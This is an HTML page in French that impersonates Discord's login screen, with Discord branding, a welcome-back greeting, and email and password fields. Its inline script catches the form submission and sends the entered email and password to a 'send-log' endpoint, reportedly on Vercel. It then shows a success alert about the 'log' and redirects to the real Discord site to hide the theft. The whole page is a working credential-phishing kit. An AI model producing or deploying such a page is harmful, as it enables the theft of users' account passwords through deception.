<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" href="logo.png" type="image/png" sizes="64x64">
    <title>Discord</title>
</head>
<body>
    <header>
        <img src="log-page.png" class="logo">
    </header>

    <div class="login">
        <h2>Ha, te revoilà !</h2>
        <p>Nous sommes si heureux de te revoir !</p>
        
        <form id="loginForm">
            <label for="email">E-MAIL OU NUMÉRO DE TÉLÉPHONE *</label>
            <input type="text" id="email" name="email" required>
            
            <label for="password">MOT DE PASSE *</label>
            <input type="password" id="password" name="password" required>
            
            <a href="#" class="forgot-password">Tu as oublié ton mot de passe ?</a>
            
            <button type="submit">Connexion</button>
        </form>
        
        <p>Besoin d'un compte ? <a href="#">S'inscrire</a></p>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Empêche le rechargement de la page
            
            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;
            
            // Envoi des données à l'API sur Vercel
            fetch("send-log", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ email: email, password: password })
            })
            .then(response => response.json())
            .then(data => {
                console.log(data); // Vérifie la réponse dans la console
                alert("Log envoyé avec succès !");
                window.location.href = "https://discord.com/channels/@me"; // Redirection après succès
            })
            .catch(error => {
                console.error("Erreur :", error);
                alert("Une erreur est survenue lors de l'envoi des logs.");
            });
        });
    </script>
</body>
</html>
